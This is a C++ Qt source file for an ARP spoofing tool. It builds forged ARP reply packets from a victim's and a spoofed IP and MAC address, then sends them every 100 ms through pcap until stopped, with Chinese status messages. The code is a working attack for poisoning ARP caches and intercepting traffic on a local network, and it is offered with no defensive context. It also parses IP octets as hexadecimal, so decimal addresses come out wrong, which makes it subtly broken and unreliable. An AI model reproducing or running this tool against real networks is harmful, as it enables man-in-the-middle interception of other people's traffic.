#include "ArpSpoof.h"

#include <QThread>
#include <QDebug>

ArpSpoof::ArpSpoof(QObject *parent)
	: QObject(parent)
{

}

ArpSpoof::~ArpSpoof()
{

}

void ArpSpoof::StartArpSpoof(const QString &nicName, const QString & spoofDstIpStr, 
	const QString spoofDstMacStr, const QString spoofIpStr, const QString spoofMacStr)
{
	QStringList spoofDstIp = spoofDstIpStr.split(".");
	QStringList spoofDstMac = spoofDstMacStr.split(":");
	QStringList spoofIp = spoofIpStr.split(".");
	QStringList spoofMac = spoofMacStr.split(":");

	ethernet_header eth;
	for (int i = 0; i < 6; i++)
	{
		eth.src_mac[i] = static_cast<u_char>(spoofMac[i].toInt(nullptr, 16));
		eth.des_mac[i] = static_cast<u_char>(spoofDstMac[i].toInt(nullptr, 16));
	}
	eth.type = htons(0x0806);
	m_packet.append((char *)&eth, sizeof(eth));

	arp_header arp;
	arp.hardware_type = htons(1);
	arp.protocol_type = htons(0x0800);
	arp.mac_length = 6;
	arp.ip_length = 4;
	arp.op_code = htons(2);
	memcpy(arp.src_mac, eth.src_mac, 6);
	memcpy(arp.des_mac, eth.des_mac, 6);
	for (int i{}; i != 4; ++i)
	{
		arp.src_ip[i] = static_cast<u_char>(spoofIp[i].toUInt(nullptr, 16));
		arp.des_ip[i] = static_cast<u_char>(spoofDstIp[i].toUInt(nullptr, 16));
	}
	m_packet.append((char *)&arp, sizeof(arp));

	char errbuf[PCAP_ERRBUF_SIZE];
	if ((m_fp = pcap_open_live(nicName.toUtf8(),
		65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, errbuf)) == nullptr)
	{
		SendText(QStringLiteral("网卡打开失败"));
		return;
	}

	emit SendText(QStringLiteral("开始发送..."));
	int count{};
	while (m_keepSend) 
	{
		m_mutex.lock();
		pcap_sendpacket(m_fp, (const u_char *)m_packet.data(), m_packet.size());
		m_mutex.unlock();
		++count;
		emit SendText(QString("Sending No.%1 ARP packets").arg(count));
		QThread::msleep(100);
	}

	m_packet.clear();
	pcap_close(m_fp);
}

void ArpSpoof::SetKeepSend(bool keepSend)
{
	m_keepSend = keepSend;
}
